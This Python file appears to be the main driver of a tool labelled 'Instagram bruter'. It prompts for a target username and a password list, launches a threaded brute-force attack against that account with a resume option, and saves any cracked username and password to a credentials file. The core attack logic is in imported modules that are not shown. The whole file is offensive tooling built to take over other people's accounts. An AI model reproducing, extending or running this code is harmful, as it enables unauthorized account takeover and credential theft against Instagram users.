# Date: 12/29/2018
# Author: Mohamed
# Description: Instagram bruter

from sys import exit
from os.path import exists
from lib.bruter import Bruter
from lib.display import Display
from lib.const import credentials, modes


class Engine(object):

    def __init__(self, username, threads, passlist_path):
        self.bruter = None
        self.resume = False
        self.is_alive = True
        self.threads = threads
        self.username = username
        self.display = Display()
        self.passlist_path = passlist_path

    def create_bruter(self):
        self.bruter = Bruter(self.username, self.threads,
                             self.passlist_path)

    def get_user_resp(self):
        return self.display.prompt('Would you like to resume the attack? [y/n]: ')

    def write_to_file(self, password):
        with open(credentials, 'at') as f:
            data = 'Username: {}\nPassword: {}\n\n'.format(
                self.username.title(), password)
            f.write(data)

    def start(self):

        self.create_bruter()

        while self.is_alive and not self.bruter.password_manager.session:
            pass

        if not self.is_alive:
            return

        if self.bruter.password_manager.session.exists:
            try:
                resp = self.get_user_resp()
            except:
                self.is_alive = False

            if resp and self.is_alive:
                if resp.strip().lower() == 'y':
                    self.bruter.password_manager.resume = True

        try:
            self.bruter.start()
        except KeyboardInterrupt:
            self.bruter.stop()
            self.bruter.display.shutdown(self.bruter.last_password,
                                         self.bruter.password_manager.attempts, len(self.bruter.browsers))
        finally:
            self.stop()

    def stop(self):
        if self.is_alive:

            self.bruter.stop()
            self.is_alive = False

            if self.bruter.password_manager.is_read and not self.bruter.is_found and not self.bruter.password_manager.list_size:
                self.bruter.display.stats_not_found(self.bruter.last_password,
                                                    self.bruter.password_manager.attempts, len(self.bruter.browsers))

            if self.bruter.is_found:
                self.write_to_file(self.bruter.password)
                self.bruter.display.stats_found(self.bruter.password,
                                                self.bruter.password_manager.attempts, len(self.bruter.browsers))


def args():
    enable_colors = str(input('Enable colors? (default: y) [y/n]: '))

    if not enable_colors:
        enable_colors = True
    else:
        if enable_colors[0].lower() == 'n':
            enable_colors = False

    display = Display(is_color=enable_colors)
    username = display.prompt('Enter a username: ')

    if not username:
        display.warning('You can\'t leave this field empty')
        display.wait()
        exit()

    passlist = display.prompt('Enter the path to your password list: ')

    if not exists(passlist):
        display.warning('Invalid path to password list', False)
        display.wait()
        exit()

    display.info('''Modes:\r
        0: => 512 passwords at a time
        1: => 256 passwords at a time
        2: => 128 passwords at a time
        3: => 64 passwords at a time
    ''', False)

    mode = display.prompt('Select a mode [0, 1, 2, 3]: ', False)

    if not mode.isdigit():
        display.warning('Mode must be a number', False)
        display.wait()
        exit()

    mode = int(mode)

    if int(mode) > 3:
        display.warning('Mode must be no more than 3', False)
        display.wait()
        exit()

    if int(mode) < 0:
        display.warning('Mode must bot no less than 0', False)
        display.wait()
        exit()

    return [username, passlist, mode]


if __name__ == '__main__':
    try:
        user_input = args()
    except KeyboardInterrupt:
        exit()

    display = Display()
    username, passlist, mode = user_input

    try:
        Engine(username, modes[mode], passlist).start()
    except:
        pass
    finally:
        display.wait()
        exit()
